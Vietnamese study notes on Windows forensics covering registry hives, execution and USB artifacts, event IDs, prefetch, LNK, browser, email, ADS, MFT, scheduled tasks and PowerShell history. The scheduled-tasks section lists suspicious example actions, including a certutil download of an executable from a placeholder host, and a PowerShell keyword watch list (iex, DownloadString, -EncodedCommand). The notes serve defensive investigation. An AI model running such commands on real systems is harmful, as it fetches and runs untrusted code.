---
layout: post
title: "Forensics: Task 2"
tags: [note, study]
---
{% raw %}
# Task-2-Forensics
Tìm hiểu về Window Registry: thay vì mỗi phần mềm tự tạo file config rời rạc, win gom hết mọi thông tin cấu hình từ phần cứng, phần mềm, user đến các chính sách bảo mật vào chung một cơ sở dữ liệu trung tâm. các file này lưu dưới dạng nhị phân, thường nằm sâu trong thư mục c:\windows\system32\config

nó kiểm soát hầu hết hoạt động trên máy. từ việc khởi động cần load driver hay service nào, đến lưu trữ phân quyền user, ghi lại lịch sử cắm usb, mở file hay chạy phần mềm nào trên hệ thống

Phân loại key:

mở regedit lên sẽ thấy 5 nhánh chính

<img width="901" height="365" alt="image" src="https://github.com/user-attachments/assets/e8f852d1-f76b-4519-8fbd-fbb2d4303d23" />

HKEY_CLASSES_ROOT :save thông tin dùng chung cho toàn bộ hệ thống

HKEY_CURRENT_USER:save thông tin cho người dùng đang đăng nhập vào hệ thống

HKEY_LOCAL_MACHINE: Chứa thông tin về hệ thống, phần cứng, phần mềm

HKEY_USERS: Chứa thông tin của tất cả các User, mỗi user là một nhánh với tên là số ID của user đó

HKEY_CURRENT_CONFIG: Lưu thông tin về phần cứng hiện tại đang sử dụng

HKEY_DYN_DATA: Là một phần của nhánh HKEY_LOCAL_MACHINE

các kiểu dữ liệu

REG_BINARY: kiểu nhị phân

- REG_DWORD: kiểu Double Word

- REG_EXPAND_SZ: kiểu chuỗi mở rộng đặc biệt. VD: "%SystemRoot%"

- REG_MULTI_SZ: kiểu chuỗi đặc biệt

- REG_SZ: kiểu chuỗi chuẩn

  vị trí:

  HKEY_LOCAL_MACHINE\SYSTEM :save các cài đặt quan trọng, làm trung tâm quản lý cấu hình hệ thống. nằm tại \system32\config\system

HKEY_LOCAL_MACHINE\SAM :save thông tin tài khoản user. nằm tại \system32\config\sam

HKEY_LOCAL_MACHINE\SECURITY :save các cài đặt bảo mật. nằm tại \system32\config\security

HKEY_LOCAL_MACHINE\SOFTWARE :save thông tin phần mềm. nằm tại \system32\config\software

HKEY_USERS\UserProfile :save thông tin người dùng. nằm tại \winnt\profiles\username

HKEY_USERS.DEFAULT :save thông tin người dùng mặc định. nằm tại \system32\config\default

transaction logs:
win không ghi trực tiếp vào hive, ghi tạm vào .LOG1, .LOG2
thu thập chứng cứ phải lấy cả log để khôi phục key bị xóa

last write time:
mỗi key có time stamp để dựng timeline
value không có

artifact forensics cốt lõi:
SYSTEM\CurrentControlSet\Enum\USBSTOR : xem lịch sử, serial usb đã cắm
UserAssist, ShimCache, Amcache : xem lịch sử chạy phần mềm, dò malware
Run, RunOnce, Services : chỗ malware hay nằm để tự khởi động

unallocated space:
key bị xóa rớt xuống vùng trống, cắm tool vẫn moi lên được

vị trí profile user win mới:
C:\Users\username\NTUSER.DAT : thay cho winnt cũ
C:\Users\username\AppData\Local\Microsoft\Windows\UsrClass.dat : xem lịch sử mở file, folder

tạo backup

bước 1: nhấn win+r gõ regedit > ok

<img width="488" height="297" alt="image" src="https://github.com/user-attachments/assets/cf0440b5-2631-4928-9731-6778c93657e2" />

bước 2: chọn file > export

<img width="883" height="538" alt="image" src="https://github.com/user-attachments/assets/a38ece83-19ea-47ad-90e5-100c90295c72" />

bước 3: mục export range chọn all > đặt tên > save

<img width="752" height="662" alt="image" src="https://github.com/user-attachments/assets/8bb4f532-5b9a-4acc-86e6-7f35f30ab84a" />

phục hồi

bước 1: nhấn win+r gõ regedit > ok

<img width="488" height="297" alt="image" src="https://github.com/user-attachments/assets/cf0440b5-2631-4928-9731-6778c93657e2" />

bước 2: chọn file > import

<img width="666" height="458" alt="image" src="https://github.com/user-attachments/assets/06eaa305-3d85-4f30-a74a-36a0a12fa299" />

bước 3: chọn file đã sao lưu > open

<img width="977" height="587" alt="image" src="https://github.com/user-attachments/assets/f84973ac-55dc-47fe-814c-6f93db746ab9" />

công cụ phân tích registry forensics:

Registry Explorer : xem timeline, khôi phục key bị xóa

RegRipper : chạy script tự động moi artifact

FTK Imager / KAPE : copy file hive khi win đang chạy, bị khóa

Volatility : trích xuất registry, dump SAM thẳng từ RAM

Tìm hiểu về artifact của THM

recent files:

win tự maintain list file mở gần đây cho từng user, save trong hive NTUSER tại:

```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
```

<img width="1365" height="735" alt="image" src="https://github.com/user-attachments/assets/28c3ac32-0fb6-40c0-8e21-0b655aeb3d76" />

dùng Registry Explorer thì nó sort MRU lên trên cùng, cũ hơn xuống dưới, list luôn last opened time

key này có sub-key theo từng extension, muốn tìm theo loại file cụ thể thì chui vào ví dụ:

```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.pdf
```

<img width="1187" height="702" alt="image" src="https://github.com/user-attachments/assets/957be406-d303-41bb-84a2-a8ea0b3d7ed3" />


---

office recent files:

office cũng maintain list riêng, save trong NTUSER tại:

```
NTUSER.DAT\Software\Microsoft\Office\VERSION
```

ví dụ office 2013:

```
NTUSER.DAT\Software\Microsoft\Office\15.0\Word
```

từ office 365 trở đi bind thêm live ID của user:

```
NTUSER.DAT\Software\Microsoft\Office\VERSION\UserMRU\LiveID_####\FileMRU
```

location này save luôn full path của file

---

shellbags:

win save layout của từng folder khi user mở, dùng để xác định file/folder nào đã được truy cập, nằm tại:

```
USRCLASS.DAT\Local Settings\Software\Microsoft\Windows\Shell\Bags
USRCLASS.DAT\Local Settings\Software\Microsoft\Windows\Shell\BagMRU
NTUSER.DAT\Software\Microsoft\Windows\Shell\BagMRU
NTUSER.DAT\Software\Microsoft\Windows\Shell\Bags
```

<img width="1412" height="713" alt="image" src="https://github.com/user-attachments/assets/b3910cbc-9401-4ca8-9a22-122c9754ad9d" />

Registry Explorer không show được nhiều, dùng ShellBag Explorer trong bộ Eric Zimmerman's tools, point vào file hive là nó parse ra luôn

---

open/save and lastvisited dialog MRUs:

win ghi nhớ location user dùng trong dialog mở/save file, trace qua:

```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePIDlMRU

```

<img width="947" height="707" alt="image" src="https://github.com/user-attachments/assets/1d7b93fa-a20d-4e5d-9cbc-f54f7f4504e7" />


và Lastvisited

```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU
```

<img width="1082" height="497" alt="image" src="https://github.com/user-attachments/assets/338b6242-151e-4cbc-af9d-3df3106aa10d" />

---

windows explorer address/search bars:


typedpaths: registry key lưu trữ các đường dẫn do người dùng gõ hoặc dán trực tiếp vào thanh địa chỉ của windows explorer.

wordwheelquery: registry key lưu trữ các từ khóa do người dùng nhập vào thanh tìm kiếm của windows explorer.
```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery
``` 

<img width="1047" height="723" alt="image" src="https://github.com/user-attachments/assets/5d53f02d-e227-4593-bd5e-09fb7249d460" />

và 

<img width="907" height="722" alt="image" src="https://github.com/user-attachments/assets/86ce3b76-c66a-459a-bd0c-8439225a0c39" />


ở task 8:

userassist:


win tự track app nào user mở qua windows explorer, save lại để thống kê. info gồm tên app, số lần chạy, thời điểm launch. key này map theo GUID của từng user nên mỗi user có riêng, nằm trong NTUSER hive tại:


```
NTUSER.DAT\Software\Microsoft\Windows\Currentversion\Explorer\UserAssist\{GUID}\Count
```


<img width="1063" height="701" alt="image" src="https://github.com/user-attachments/assets/3715ea71-4474-43d8-8035-eecea108975a" />


app chạy qua cmd thì không có ở đây

---

shimcache:

mục đích gốc là đảm bảo app cũ vẫn chạy được trên win mới, nhưng forensics khai thác nó vì nó track tất cả app đã chạy trên máy, nằm trong SYSTEM hive tại:

```
SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
```

save: tên file, file size, last modified time của executable

Registry Explorer không phân tích được, phải dùng AppCompatCache Parser trong bộ Eric Zimmerman's tools, output ra CSV rồi xem bằng EZviewer:

```
AppCompatCacheParser.exe --csv <path to save output> -f <path to SYSTEM hive> -c <control set to parse>
```

---

amcache:

artifact họ hàng với shimcache, cùng track app đã chạy nhưng save thêm nhiều thứ hơn, đặc biệt là có SHA1 hash của executable nên dùng để dò malware được. file hive nằm thẳng trên filesystem tại:

```
C:\Windows\appcompat\Programs\Amcache.hve
```

info program execute gần nhất nằm tại:

```
Amcache.hve\Root\File\{Volume GUID}\
```

save: execution path, installation time, execution time, deletion time, SHA1 hash


BAM/DAM:

**BAM** — Background Activity Monitor: track background app đang chạy

**DAM** — Desktop Activity Moderator: quản lý power consumption

cả hai thuộc Modern Standby system, forensics quan tâm vì nó save full path và last execution time của program, nằm trong SYSTEM hive tại:

```
SYSTEM\CurrentControlSet\Services\bam\UserSettings\{SID}
SYSTEM\CurrentControlSet\Services\dam\UserSettings\{SID}
```

key theo SID nên mỗi user có data riêng

---

ở lab 9

các artifact được liệt kê là:

device identification

công dụng: theo dõi các USB đã được cắm vào hệ thống. artifact này lưu trữ các thông tin như ID nhà sản xuất, ID sản phẩm , phiên bản (version) và thời gian USB được cắm vào để giúp điều tra viên xác định chính xác các thiết bị duy nhất


<img width="1346" height="711" alt="image" src="https://github.com/user-attachments/assets/a5568959-0c37-4386-b5ee-8fe54a0dac0f" />


First/Last Time

công dụng: theo dõi và cung cấp các mốc thời gian cụ thể về việc kết nối và ngắt kết nối của thiết bị, bằng cách thay thế 4 số cuối trong đường dẫn,có thể tìm được:

0064: thời gian kết nối lần đầu

0066: thời gian kết nối lần cuối

0067: thời gian ngắt kết nối/rút ra lần cuối

SYSTEM\CurrentControlSet\Enum\USBSTOR\Ven_Prod_Version\USBSerial#\Properties\{83da6326-97a6-4088-9453-a19231573b29}\####

Máy em chưa có USBSTOR vì chưa ghi nhận USB storage/removable drive được cắm vào nênn không thể cap được 

USB device Volume Name

công dụng: dùng để tìm tên thiết bị của ổ đĩa được kết nối.có thể sử dụng thông tin mã định danh GUID ở khóa này để đối chiếu với Disk ID từ các phần định danh ở trên, từ đó liên kết chính xác tên gọi của các thiết bị duy nhất

SOFTWARE\Microsoft\Windows Portable Devices\Devices

<img width="1912" height="1074" alt="image" src="https://github.com/user-attachments/assets/46d0d5b6-4b6d-4317-ac9e-7c6efefa24d2" />

tìm hiểu sâu về các artifact forensics

1. event logs

công dụng:
event logs là nhật ký hoạt động của windows. artifact này dùng để xem hệ thống đã xảy ra chuyện gì, ai đăng nhập, đăng nhập lúc nào, có lỗi gì, có chạy service, powershell, rdp hay scheduled task không.

vị trí:

C:\Windows\System32\winevt\Logs\

<img width="1016" height="973" alt="image" src="https://github.com/user-attachments/assets/e9249af7-3364-44ba-a395-a590de832dff" />


các file hay gặp:


Security.evtx


<img width="813" height="73" alt="image" src="https://github.com/user-attachments/assets/fe063d5e-e00e-4aca-b387-c8990d8263fe" />


System.evtx


<img width="461" height="55" alt="image" src="https://github.com/user-attachments/assets/2e9e979c-fd73-4dc3-9209-9fc85d8d80bd" />


Application.evtx


<img width="517" height="88" alt="image" src="https://github.com/user-attachments/assets/68336318-d5a3-42a5-9051-1ec3997b0973" />



Microsoft-Windows-PowerShell%4Operational.evtx


<img width="750" height="108" alt="image" src="https://github.com/user-attachments/assets/9e558edf-3866-47aa-9d87-e86f8e773965" />


Windows PowerShell.evtx


<img width="807" height="94" alt="image" src="https://github.com/user-attachments/assets/2cfb520d-4fbd-4fc4-87b3-fae3e3d0d09b" />


Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx


<img width="793" height="150" alt="image" src="https://github.com/user-attachments/assets/14186fa8-00e8-414d-a2bf-559f55ef51e6" />



soi gì:
Security.evtx: soi đăng nhập, đăng xuất, user, quyền admin
System.evtx: soi service, driver, shutdown, startup
PowerShell logs: soi lệnh/script powershell
TaskScheduler logs: soi task được tạo, sửa, xóa, chạy
TerminalServices logs: soi RDP

event id hay gặp:

4624 = đăng nhập thành công
4625 = đăng nhập thất bại
4634 = đăng xuất
4648 = đăng nhập bằng credential cụ thể
4672 = tài khoản có quyền đặc biệt
4720 = tạo user
4726 = xóa user
4732 = thêm user vào group
7045 = service mới được cài
1149 = RDP authentication thành công
21 = RDP session logon
23 = RDP session logoff
106 = task được register
200 = task action started
201 = task action completed
4104 = powershell script block logging

tool:
Event Viewer


<img width="600" height="395" alt="image" src="https://github.com/user-attachments/assets/d29984ec-29db-4727-a9fc-ce81c8b10b59" />


EvtxECmd


<img width="1024" height="497" alt="image" src="https://github.com/user-attachments/assets/4e0548ca-3f3a-4159-9c06-fb328a83b66d" />


note:
event logs là artifact nên soi đầu tiên khi dựng timeline. nó cho biết bối cảnh chính: ai vào máy, vào bằng cách nào, lúc nào, và có hành động hệ thống gì xảy ra.


2. prefetch


<img width="997" height="995" alt="image" src="https://github.com/user-attachments/assets/6e782769-91eb-49a6-8185-f2a85fee30e0" />


công dụng:
prefetch dùng để xác định chương trình nào đã từng chạy trên máy. nó lưu tên executable, số lần chạy, thời gian chạy gần nhất và một số file/dll được load khi chương trình chạy.

vị trí:

C:\Windows\Prefetch\

file có dạng:

POWERSHELL.EXE-xxxxxxxx.pf

CMD.EXE-xxxxxxxx.pf

CHROME.EXE-xxxxxxxx.pf

MALWARE.EXE-xxxxxxxx.pf

soi gì:
- tên file exe đã chạy
- run count
- last execution time
- previous execution times
- path/file liên quan được load
- volume information

tool:
PECmd

<img width="718" height="377" alt="image" src="https://github.com/user-attachments/assets/fe40cb7f-1b83-451e-a44d-e181437eb832" />


 WinPrefetchView


<img width="293" height="172" alt="image" src="https://github.com/user-attachments/assets/b7f84207-ae64-4cbd-8d48-cefc7e563037" />


Timeline Explorer


<img width="1274" height="761" alt="image" src="https://github.com/user-attachments/assets/59e4288e-e039-4ed9-bbf8-759f84cf3a54" />


ghi chú:
prefetch rất mạnh để chứng minh một file exe từng được chạy, kể cả khi file gốc đã bị xóa. nhưng trên windows server hoặc máy bị tắt prefetch thì có thể không có artifact này.


3. lnk files

công dụng:
lnk là shortcut file. windows thường tạo lnk khi user mở file gần đây. artifact này giúp biết user đã mở file nào, file đó nằm ở đâu, có nằm trên usb/network share không, và đôi khi lưu cả volume label, serial, hostname.

vị trí:

C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Recent\


<img width="1010" height="989" alt="image" src="https://github.com/user-attachments/assets/7eafa652-82f6-4250-b413-a61c14c05ca1" />


office recent:

C:\Users\<user>\AppData\Roaming\Microsoft\Office\Recent\

pinned/taskbar:

C:\Users\<user>\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\


<img width="970" height="919" alt="image" src="https://github.com/user-attachments/assets/b118b2a6-217e-4e01-80fc-370884ff7d06" />


soi gì:
- target path
- working directory
- command line arguments
- created/modified/accessed time của target
- lnk MAC time
- volume label
- volume serial number
- drive type
- network path
- machine id / hostname

ví dụ:
E:\secret\report.docx
\\192.168.1.10\share\payload.exe

tool:
- LECmd
- JumpList Explorer
- KAPE
- FTK Imager
- Autopsy

ghi chú:
lnk cực hữu ích khi file gốc đã bị xóa. nó vẫn có thể giữ lại đường dẫn cũ, tên file, ổ đĩa, usb label hoặc network share từng được mở.


4. browser history

công dụng:
browser history dùng để điều tra hoạt động web của user: đã truy cập website nào, tải file gì, tải từ đâu, lưu ở đâu, tìm kiếm gì, có cookie/session/cache gì không.

vị trí chrome hoặc Cococ:

C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\


<img width="1002" height="955" alt="image" src="https://github.com/user-attachments/assets/e902a96b-7d77-4fb5-b780-384b8e2a05e3" />


vị trí edge:

C:\Users\<user>\AppData\Local\Microsoft\Edge\User Data\Default\


<img width="1012" height="960" alt="image" src="https://github.com/user-attachments/assets/6b1057c7-d5e1-4ffe-8487-04a1da5ae55b" />


file quan trọng chrome/edge:


History

Cookies

Login Data

Web Data

Cache\

Code Cache\

Network\


soi gì:
- url đã truy cập
- visit time
- typed count
- download path
- download source url
- search keyword
- cookies
- cache
- extension đáng ngờ

table chrome/edge hay soi:

urls

visits

downloads

downloads_url_chains

keyword_search_terms

tool:
- DB Browser for SQLite
- Hindsight
- BrowsingHistoryView
- Browser History Capturer
- NirSoft tools
- KAPE

ghi chú:
browser history giúp nối được hành vi tải malware/phishing/webmail/cloud. khi thấy file độc trong Downloads, nên soi browser để biết nó tải từ URL nào.


5. ost/pst file

công dụng:
ost/pst là file dữ liệu của microsoft outlook. dùng để phân tích email, attachment, mail gửi/nhận, mail đã xóa, calendar, contacts và dấu hiệu phishing/exfil qua email.

khác nhau:
OST = Offline Storage Table, thường là cache từ Exchange/Office 365/IMAP
PST = Personal Storage Table, thường là file archive/export cá nhân

vị trí OST:

C:\Users\<user>\AppData\Local\Microsoft\Outlook\

<img width="1006" height="716" alt="image" src="https://github.com/user-attachments/assets/56a19425-4081-4d63-ba66-a8c01c6b6e44" />


vị trí PST:

C:\Users\<user>\Documents\Outlook Files\


<img width="988" height="963" alt="image" src="https://github.com/user-attachments/assets/9e10254b-268d-4958-89ee-70eb4c72520b" />


hoặc nơi user tự lưu.

soi gì:
- inbox/sent/deleted
- subject
- sender
- recipient
- cc/bcc
- timestamp
- attachment
- message-id
- conversation thread
- calendar
- contacts
- mail đã xóa nếu chưa purge

tool:
- Outlook
- Xst Reader
- Kernel OST Viewer
- PST Viewer
- Aid4Mail
- FTK Imager
- Autopsy
- Magnet AXIOM

ghi chú:
ost/pst rất quan trọng khi nghi ngờ phishing hoặc exfil qua mail. nên soi cả sent items, deleted items và attachment.


6. eml file

công dụng:
eml là file email dạng raw message. nó chứa header, body, MIME structure và attachment. dùng nhiều khi phân tích phishing email hoặc email export riêng lẻ.

vị trí:
không có vị trí cố định, thường nằm ở:

C:\Users\<user>\Downloads\
C:\Users\<user>\Desktop\
C:\Users\<user>\Documents\
thư mục export email

soi gì:
- From
- To
- Cc/Bcc
- Subject
- Date
- Message-ID
- Received chain
- Reply-To
- Return-Path
- DKIM-Signature
- Authentication-Results
- X-Originating-IP
- Content-Type
- MIME boundary
- attachment filename
- url trong body

tool:
- Thunderbird
- emlAnalyzer
- CyberChef
ghi chú:
với eml phishing, không chỉ nhìn From. phải soi Received chain, Reply-To, Return-Path, Authentication-Results và attachment/url trong body.


7. alternate data stream

công dụng:
alternate data stream, viết tắt ADS, là tính năng của NTFS cho phép một file có thêm stream dữ liệu ẩn. attacker có thể giấu payload hoặc script trong ADS.

ví dụ:

note.txt:hidden.exe
test.txt:hidden.ps1

vị trí:
ADS không nằm ở folder riêng. nó gắn trực tiếp vào file trên phân vùng NTFS.

ví dụ:

C:\Users\Public\readme.txt:payload.exe
C:\Temp\test.txt:hidden.ps1

cách kiểm tra bằng cmd:

dir /r

<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/2a3dd734-eba2-4585-9fd4-8cedcad9a781" />


cách kiểm tra bằng powershell:

Get-Item -Path .\file.txt -Stream *
Get-Content .\file.txt -Stream hidden


<img width="1423" height="751" alt="image" src="https://github.com/user-attachments/assets/a25a98b0-bdab-4199-970b-8c0e1d45d3d7" />


soi gì:
- tên stream
- kích thước stream
- file host
- nội dung stream
- Zone.Identifier

Zone.Identifier:
đây là ADS phổ biến, cho biết file có nguồn từ internet hay không.

ví dụ:

download.exe:Zone.Identifier

có thể chứa:

ZoneId=3
ReferrerUrl=
HostUrl=

tool:
- dir /r
- PowerShell Get-Item -Stream
- streams.exe
- MFTECmd
- FTK Imager
- Autopsy

ghi chú:
ADS hay bị bỏ qua vì nhìn file bình thường không thấy. khi gặp file đáng ngờ trên NTFS, nên chạy dir /r hoặc streams.exe để kiểm tra.


8. RDP Cache

công dụng:
RDP Cache lưu lại các mảnh hình ảnh bitmap khi user dùng Remote Desktop. artifact này có thể giúp phục dựng một phần màn hình remote mà user từng nhìn thấy.

vị trí:

C:\Users\<user>\AppData\Local\Microsoft\Terminal Server Client\Cache\

file thường gặp:

Cache0000.bin
Cache0001.bin
bcache22.bmc
bcache24.bmc

soi gì:
- fragment màn hình remote
- cửa sổ ứng dụng
- tên file hiển thị
- terminal output
- địa chỉ ip/hostname nếu xuất hiện trên giao diện
- tool attacker mở trong phiên RDP

tool:
- BMC-Tools
- RdpCacheStitcher
- RDP Cache Stitcher

ghi chú:
RDP Cache không phải lúc nào cũng reconstruct đẹp. nó thường dùng làm bằng chứng hỗ trợ, nhất là khi cần ảnh màn hình từ phiên remote.


9. MFT

công dụng:
MFT, tức Master File Table, là bảng quản lý file chính của NTFS. gần như mọi file/folder trên phân vùng NTFS đều có record trong MFT. dùng để biết file từng tồn tại, bị xóa, đổi tên, tạo/sửa/truy cập lúc nào.

vị trí:

vị trí: Nằm ẩn tại thư mục gốc của bất kỳ phân vùng nào được định dạng NTFS (Ví dụ đường dẫn logic: C:\$MFT). Tệp tin này bị khóa ở cấp độ nhân (Kernel) của hệ điều hành, không thể nhìn thấy hay truy cập qua File Explorer thông thường, mà phải trích xuất thông qua các công cụ đọc đĩa vật lý


<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/85b9da67-065a-4abc-b1ca-c2e1eb3c9e95" />


soi gì:
- filename
- full path nếu reconstruct được
- file size
- allocated/deleted status
- MFT entry number
- parent entry number
- resident/non-resident data
- ADS information
- timestamps

timestamp quan trọng:

$STANDARD_INFORMATION
$FILE_NAME

mỗi nhóm thường có:

Created
Modified
MFT Changed
Accessed

tool:
- MFTECmd
- MFTExplorer
- AnalyzeMFT
- Autopsy
- FTK Imager
- KAPE
- Timeline Explorer

MFT để dựng timeline file system. nó có thể cho thấy file đã từng tồn tại dù hiện bị xóa. khi nghi timestomping, nên so timestamp giữa $STANDARD_INFORMATION và $FILE_NAME.


10. scheduled tasks

công dụng:
scheduled tasks dùng để tự động chạy chương trình theo lịch hoặc trigger. trong for, artifact này rất quan trọng vì malware hay dùng nó để persistence.

vị trí task XML:

C:\Windows\System32\Tasks\

<img width="954" height="1048" alt="image" src="https://github.com/user-attachments/assets/880187f2-f498-4ba4-9b66-40946da5c98b" />

vị trí registry:

HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks

<img width="908" height="732" alt="image" src="https://github.com/user-attachments/assets/676fb57f-5780-4a2b-bd61-0ec989fa2ede" />


HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree

<img width="1186" height="718" alt="image" src="https://github.com/user-attachments/assets/8bb50026-72f0-4f47-a1aa-9dcfece59a68" />


event log:

C:\Windows\System32\winevt\Logs\Microsoft-Windows-TaskScheduler%4Operational.evtx

soi gì:
- task name
- author
- user id
- run level
- trigger
- action
- command
- arguments
- working directory
- created time
- modified time
- last run time
- next run time

action đáng ngờ:

powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\a.ps1
cmd.exe /c certutil -urlcache -f http://example.com/a.exe a.exe
wscript.exe C:\Users\Public\run.vbs
rundll32.exe C:\ProgramData\evil.dll,Start

tool:
- Task Scheduler
- Autoruns
- Registry Explorer
- EvtxECmd
- KAPE

ghi chú:
khi thấy malware chạy lại sau reboot, nên soi scheduled tasks cùng Run/RunOnce/Services. task có thể bị xóa, nên cần soi thêm event log TaskScheduler.


11. powershell history

công dụng:
powershell history lưu lại lệnh user nhập trong PowerShell interactive session. artifact này giúp biết attacker/user đã gõ lệnh gì.

vị trí:

C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt


<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/b9f6b8ea-7f0a-4ab1-bfe4-6a6364480b21" />


soi gì:
- lệnh tải file
- lệnh chạy script
- encoded command
- bypass execution policy
- disable defender
- tạo scheduled task
- tạo registry persistence
- tạo user
- gọi web request

lệnh đáng chú ý:

Invoke-WebRequest

iwr

wget

curl

Invoke-Expression

iex

DownloadString

FromBase64String

-EncodedCommand

-enc

Start-Process

New-ItemProperty

Set-ItemProperty

Add-MpPreference

Set-MpPreference

New-ScheduledTask

schtasks

artifact liên quan:

C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx

<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/39fbcc37-8790-4a22-b4ad-40c901ac8826" />


C:\Windows\System32\winevt\Logs\Windows PowerShell.evtx

<img width="1919" height="1023" alt="image" src="https://github.com/user-attachments/assets/406ad9dd-9be0-4393-8ea1-0cc411b9a54b" />



tool:
- Notepad
- Timeline Explorer
- EvtxECmd
- Chainsaw
- Hayabusa
- CyberChef

ghi chú:
powershell history có thể bị xóa rất dễ, nên không nên phụ thuộc một mình nó. phải đối chiếu thêm event logs 4103/4104, prefetch, scheduled tasks và MFT.

lab Windowns Fudamentals 1
```
https://github.com/nhut120c-boop/Lab-Windows-Fundamentals-1/blob/main/README.md
```
lab Windowns Fudamentals 2
```
https://github.com/nhut120c-boop/Windows-Fundamentals-2/blob/main/README.md
```
Investigating-Windows
```
https://github.com/nhut120c-boop/study-notes/tree/main/TryHackMe/Investigating-Windows
```

tool Autopsy
```
https://github.com/nhut120c-boop/study-notes/tree/main/Forensics/Tool

```
Hireme lab
```
https://github.com/nhut120c-boop/study-notes/blob/main/Forensics/HireMe%20Lab/REAME.md
```
Chall: 
```
https://github.com/nhut120c-boop/study-notes/tree/main/Forensics/Basic-Disk
```

{% endraw %}